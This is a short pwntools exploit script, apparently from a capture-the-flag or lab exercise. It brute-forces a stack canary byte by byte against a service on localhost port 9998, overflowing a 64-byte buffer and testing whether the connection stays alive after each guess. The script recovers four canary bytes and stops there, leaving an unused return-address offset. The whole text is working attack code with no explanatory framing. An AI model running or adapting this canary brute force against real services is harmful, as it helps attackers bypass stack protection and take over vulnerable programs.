from pwn import *
canaryStart = 64
retStart = 80

canaryNotMatch = -1

def payOwerrCanB(byte, found):
	return 'a'*64 + found + byte

def tryOwerright(val, found):
	byte = struct.pack("B", val)
	payload = payOwerrCanB(byte , found)
	time.sleep(0.005)
	p = connect('localhost',9998)
	p.clean()
	p.sendline(payload)
	time.sleep(0.005)
	p.sendline("checking if still connected")
	if(p.connected()):
		return val
	return canaryNotMatch


def findIByte(i, found):
	for j in range(0, 256):
		if(j == 10):
			continue
		result = tryOwerright(j, found)
		if(result != canaryNotMatch):
			print("find "+str(j))
			return found + struct.pack("B", j)

	return -1


b1 = findIByte(1, '')
b2 = findIByte(2, b1)
b3 = findIByte(3, b2)
b4 = findIByte(4, b3)









